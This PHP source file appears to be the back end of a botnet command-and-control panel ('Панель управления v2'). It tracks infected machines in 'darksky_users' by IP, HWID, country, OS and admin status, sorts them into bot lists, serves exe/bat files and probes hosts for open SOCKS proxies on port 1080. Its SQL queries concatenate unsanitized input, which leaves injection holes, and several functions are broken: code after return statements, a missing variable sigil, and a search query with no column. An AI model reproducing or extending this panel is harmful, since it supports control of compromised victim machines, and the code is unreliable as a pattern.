<?
	include_once('config/config.php');
	
	DEFINE('title', ' Панель управления v2');
	DEFINE('sep', ' - ');
	DEFINE('FILES', '');

	class GlobalCore
	{
		
   	 public $UT;
   	 
		var $pages, $autoclear, $dir, $domain, $lang, $ht, $settings, $showcmd, $login, $pass, $mode, $access, $title, $maxusers, $repeatban, $autoban, $return_err;
		
			function __construct(){
			global $mysqli;
				$this->settings = $this->LoadConfig();
				$t = $this->settings;
				$this->dir = $t[0];
				$this->domain = $t[1];
				$this->lang = $t[2];
				$this->ht = $t[3];
				$this->autoclear = $t[4];
				$this->showcmd = $t[5];
				$this->pages = $t[6];
				$this->login = $t[7];
				$this->pass = $t[8];
				$this->mode = $t[9];
				$this->access = $t[10];
				$this->title = ' — ' . $t[11];
				$this->maxusers = $t[12];
				$this->repeatban = $t[13];
				$this->autoban = $t[14];
				$this->move_list = $t[15];
				$UT = time()+7200;
				$this->return_err = array(
											0 => 'Отсутствует подключение к базе данных',
											1 => '',
											2 => '');
			}
			
			function return_error($id_error){
				return '<div id="alert" class="alert fade alert-success" data-alert="alert">' . $this->return_err[id_error];
			}
			
			
			function DeleteList($id){
			global $mysqli;
				if(is_numeric($id)){
					$result = $mysqli->query('DELETE FROM darksky_category WHERE id = '.$id.'');
					if($result){
						return true;
					} else {
						return false;
					}
				}
				$mysqli->close();
			}
			
			function AddToList($name){
			global $mysqli;
				if(!empty($name)){
					$result = $mysqli->query('SELECT COUNT(*) FROM `darksky_category` WHERE `title` = "'.$name.'"  LIMIT 1');
					$num_rows = $result->fetch_row();
					if($num_rows[0] == '0'){
						$s1 = $mysqli->query('INSERT INTO `darksky_category` (`id`, `title`, `bots`) VALUES ("NULL", "'.$name.'", "")');
						if($s1){
							return true;
						} else {
							return false;
						}
					} else {
						return false;
					}
				} else {
					return false;
				}
				$mysqli->close();
			}
			
			function LoadLists($id){
			global $mysqli;
			$index = 0;
				if($id == 0) $result = $mysqli->query('SELECT * FROM darksky_category WHERE 1');
				if(is_numeric($id) || strlen($id)>0 ) $result = $mysqli->query('SELECT * FROM darksky_category WHERE id='.$id.'');
				
				if(!(empty($result)) || !($result==false)){
					while ($row = $result->fetch_assoc()){
						$info1[$index] = $row;
						$index++;
					}
						return $info1;
				} else {
					return false;
				}
				$mysqli->close();
			}
			
			function RenameList($cat, $name){
			global $mysqli;
				$sql = 'UPDATE `darksky_category` SET `title`="'.$name.'" WHERE id="'.$cat.'"';
				$res = $mysqli->query($sql);
				return $res;
				$mysqli->close();
			}
		
			function LoadConfig(){
			global $mysqli;
				$sql = 'SELECT * FROM a_config WHERE 1';
				$res = $mysqli->query($sql);
				$row = $res->fetch_row();
				return $row;
				$mysqli->close();
			}
			
			function AddBotsToList($cat, $array){
				global $mysqli;
				$ids = array();
				$index = count($array);
					foreach ($array as $value):
						$ids[] = '"' . $value . '",';
					endforeach;
					$sql = 'UPDATE `darksky_users` SET `category`=\''.$cat.'\' WHERE `id` IN ('.substr(implode($ids), 0, -1).')';
				$result = $mysqli->query($sql);
				return $result.$sql;
				if($result == true){
					$this_list = $this->LoadLists($cat);
					$sql = 'UPDATE `darksky_category` SET `bots`="'.$index.'" WHERE id="'.$cat.'"';
					$result = $mysqli->query($sql);
				}
				return $result;
				$mysqli->close();
			}
			
			function ExplodeDataMounthDayTime($str){ //date reg
				$s = explode(' ', $str);
				$b = explode(':', $s[1]);
				$a = explode('-', $s[0]);
				return $a[1].'-'.$a[2].' '.intval($b[0]).':'.$b[1];
			}
			
			function FBytes($size, $param = 'kb') {
			if(strlen($size)==6) $param = 'kb';
			if(strlen($size)==7) $param = 'mb';
			if(strlen($size)==10) $param = 'gb';
   		    switch($param)  {
                case 'gb': $size /= 1024;
                case 'mb': $size /= 1024;
                case 'kb': $size /= 1024;
    		    }
					if (($param == 'kb') && (strlen($size)>8)){
					$arrsize = explode('.', $size);
					$size = $arrsize[0];
					}
    			return substr($size, 0, 4) . ' '.$param;
			}
			
			function LoadFiles(){
				$a = __DIR__;
				$full = substr($a, 0, -8) . '/files/';
				$entries = scandir($full);
				$filelist = array();
				for ($x=1; $x<count($entries); $x++){
				//foreach($entries as $entry) {
					//if(is_dir($entries[$x])==false):
     			  	 $filelist[$x][0] = $entries[$x];
     				   $filelist[$x][1] = $this->FBytes(filesize($full . $entries[$x]));
     					$filelist[$x][2] = filectime($full . $entries[$x]);
     					$filelist[$x][3] = posix_getpwuid(fileowner($full . $entries[$x]));
     			//	endif;
				}
				
				return $filelist;
			}
			
			function DeleteFile($filename){
				if(file_exists('./files/' . $filename)){
					unlink('./files/'.$filename);
					return true;
				} else {
					return false;
				}
			}
			
			function renameFile($old_filename, $new_filename){
				$check_i = 0;
				$except = array('exe', 'bat');
				$imp = implode('|', $except);
				$files = array($old_filename, $new_filename);
				
				foreach($files as $file):
					if(preg_match('/^.*\.('.$imp.')$/i', $file)):
						$check_i = $check_i + 1;
					endif;
				endforeach;
				
					if ($check_i == 2):
						return rename('./files/'.$old_filename, './files/'.$new_filename);
					else:
						return false; 
					endif;
			

			}
			
			
			function UpdateConfig1($path, $domain, $lang, $chpu, $move_list){
			global $mysqli;
				$sql = 'UPDATE a_config SET path = \''.$path.'\', domain = \''.$domain.'\', lang = \''.$lang.'\', chpu = \''.$chpu.'\',
				move_list = \''.$move_list.'\' WHERE 1';
				return $mysqli->query($sql);
				$mysqli->close();
			}
			
			function ExplodeData($str){ //activity bots
				
				$s = explode(' ', $str);
				$b = explode(':', $s[1]);
				return $s[0].' '.intval($b[0]+2).':'.$b[1];
			}
			
			function UpdateConfig2($autoclear, $viewcmd, $pages, $repeatban, $autoban, $mode){
			global $mysqli;
				$sql = 'UPDATE a_config SET cache_delete = \''.$autoclear.'\', viewlastcmd = \''.$viewcmd.'\',
				maxusers = \''.$pages.'\', mode = \''.$mode.'\', repeatban = \''.$repeatban.'\', autoban = \''.$autoban.'\' WHERE 1';
				$res = $mysqli->query($sql);
				return $res;
				$mysqli->close();
			}
			
			function Enc($str){
				return mb_convert_encoding($str, 'utf-8', 'auto');
			}
			
			function Search($str){
			global $mysqli;
			$index = 0;
			$searched= array();
			$sql = "SELECT * FROM darksky_users WHERE
					LIKE \'%$str%\' OR `ip`
					LIKE \'%$str%\' OR `time`
					LIKE \'%$str%\' OR `hwid`
					LIKE \'%$str%\' OR `country`
					LIKE \'%$str%\' OR `countrycode`
					LIKE \'%$str%\' OR `os`
					LIKE \'%$str%\' OR `userpc`
					LIKE \'%$str%\' OR `status`
					LIKE \'%$str%\' OR `isadmin`
					LIKE \'%$str%\' OR `datereg`";
			//$result = $mysqli->query($sql);
			//if (!$result) {return "Database Error [{$this->database->errno}] {$this->database->error}";}
			if ($result = $mysqli->query($sql)) {
				while ($row = $result->fetch_assoc()){
					$searched[$index] = $row;
					$index++;
				}
			}
			return $searched . $sql;
			$mysqli->close();
			
			}
			
			function RemoteCheck($ip, $port){
				$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
					$connection = @socket_connect($socket, $ip, $port);
					if($connection)
					{
					   socket_close($socket);
					   return true;
					} else {
						return false;
					}
			}
			
			function check_socks($host){
				$ports = array(1080);
				foreach ($ports as $port){
					$connection = @fsockopen($host, $port);
					if (is_resource($connection)){
						return true;
						fclose($connection);
					}else{
						return false;
					}
				}
			}
		
			
	function check_http_status($url)  {
 	 $user_agent = 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)';
	  $ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSLVERSION, 3);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
 	 $page = curl_exec($ch);

	  $err = curl_error($ch);
  	if (!empty($err)) return 'Error! HTTP Code: ' . $err;
  
 	 $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	  curl_close($ch);
	  return 'Good HTTP Code: '. $httpcode;
  	}
			
	}
	
	
?>